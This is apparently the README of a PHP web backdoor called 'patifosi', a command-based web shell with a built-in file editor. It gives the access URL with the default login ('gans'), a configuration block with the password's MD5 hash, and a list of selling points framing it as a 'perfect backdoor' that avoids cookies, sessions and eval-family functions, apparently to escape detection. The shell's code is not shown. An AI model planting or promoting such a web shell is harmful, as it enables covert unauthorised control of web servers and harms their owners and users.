# patifosi
PHP Web Backdoor command based, with text editor from codemirror.

## how to access it
http://localhost/patifosi.php?login=gans

## set config
```
$param = 'login';                             // login input
$pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
$inDir = true;                             // true or false, to enable input dir
$out   = 'exit;';                         // string, not login
$enc   = true;                           // js must enabled, editor & upload not encoded
$img   = 'https://media.giphy.com/media/XoxPRR71OevDzqllyt/giphy.gif';
```

## about

- perfect backdoor
- without cookie & session
- without eval & passthru family
- can't passing double argument on function
